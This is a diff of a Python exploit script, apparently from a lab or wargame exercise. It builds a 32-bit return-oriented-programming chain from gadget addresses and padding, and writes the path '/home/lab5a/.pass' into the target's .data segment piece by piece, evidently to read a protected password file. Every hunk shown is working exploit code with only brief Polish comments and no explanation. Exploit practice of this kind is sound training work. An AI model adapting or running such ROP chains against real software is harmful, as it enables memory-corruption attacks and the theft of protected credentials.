@@ -14,11 +14,12 @@ PADDING = pack('<I', 0x41414141)
 
 p = ''
 
+# PARAM ON STACK
 # /hom
 # e/la
 # b5a/
 # .pas
-# s000
+# s0
 
 p += POP_EDX  # pop edx ; ret
 p += DATA_ADDR  # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
@@ -56,27 +57,21 @@ p += 'e/la'
 p += MOV_EDX_EAX
 
 p += POP_EDX  # pop edx ; ret
-p += pack('<I', 0x080eb060 + 17) # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
+p += pack('<I', 0x080eb060 + 17)
 p += POP_EAX
 p += 'b5a/'
 p += MOV_EDX_EAX
 
 p += POP_EDX  # pop edx ; ret
-p += pack('<I', 0x080eb060 + 21) # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
+p += pack('<I', 0x080eb060 + 21)
 p += POP_EAX
 p += '.pas'
 p += MOV_EDX_EAX
 
 p += POP_EDX  # pop edx ; ret
-p += pack('<I', 0x080eb060 + 24) # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
-p += POP_EAX
-p += 's'
-p += MOV_EDX_EAX
-
-p += POP_EDX
 p += pack('<I', 0x080eb060 + 25)
 p += POP_EAX
-p += XOR_EAX_EAX
+p += pack('<I', 0x00000073)
 p += MOV_EDX_EAX
 
 p += POP_EDX
